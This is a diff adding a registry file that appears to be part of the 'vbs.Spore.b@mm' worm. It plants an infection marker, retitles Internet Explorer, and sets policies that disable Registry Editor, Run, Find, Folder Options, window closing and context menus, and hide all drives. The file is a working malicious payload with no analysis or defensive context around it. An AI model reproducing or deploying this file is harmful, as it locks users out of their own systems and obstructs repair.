@@ -1,0 +1,22 @@
+REGEDIT4
+
+ [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\SysBIOS]
+ [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\SysBIOS\Virii]
+ [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\SysBIOS\Virii\Spore.b]
+  "Sys_Infected"="vbs.Spore.b@mm"
+
+ [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
+  "Window Title"="vbs.Spore.b@mm (c) 2004"
+
+ [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
+  "DisableRegistryTools"=dword:00000001
+
+ [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+  "NoFolderOptions"=dword:00000001
+  "NoWinKeys"=dword:00000001
+  "NoViewContextMenu"=dword:00000001
+  "NoClose"=dword:00000001
+  "NoSetFolders"=dword:00000001
+  "NoDrives"=dword:03ffffff
+  "NoRun"=dword:00000001
+  "NoFind"=dword:00000001
